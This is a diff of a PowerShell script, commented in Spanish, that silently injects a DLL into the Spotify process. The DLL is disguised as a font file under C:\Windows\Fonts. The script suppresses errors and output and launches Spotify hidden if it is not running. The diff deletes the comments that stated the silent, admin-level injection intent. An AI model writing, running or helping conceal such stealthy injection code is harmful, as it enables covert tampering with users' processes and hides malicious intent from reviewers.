@@ -1,7 +1,3 @@
-# Inyecta un DLL en el proceso de Spotify de forma completamente silenciosa.
-# Requiere ejecutar como Administrador.
-# No muestra ningún mensaje ni cierra la consola.
-
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 
@@ -62,14 +58,12 @@ function Inject-Dll {
 }
 
 # --- CONFIGURACIÓN ---
-$dll = "C:\Windows\Fonts\dafont.ttf"
+$dll = "C:\Windows\Fonts\dafont.ttf"  # Cambia por tu DLL real si es necesario
 $proc = "Spotify"
 $spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
 
-# Si Spotify no está abierto, lo inicia como proceso independiente y oculto
 if (-not (Get-Process -Name $proc -ErrorAction SilentlyContinue)) {
     Start-Process -FilePath $spotifyPath -WindowStyle Hidden
-    # Esperar hasta que el proceso esté disponible (timeout 20s)
     $retry = 0
     while (-not (Get-Process -Name $proc -ErrorAction SilentlyContinue)) {
         Start-Sleep -Milliseconds 500
@@ -78,5 +72,4 @@ if (-not (Get-Process -Name $proc -ErrorAction SilentlyContinue)) {
     }
 }
 
-# Inyectar el DLL de forma silenciosa
 Inject-Dll -ProcessName $proc -DllPath $dll
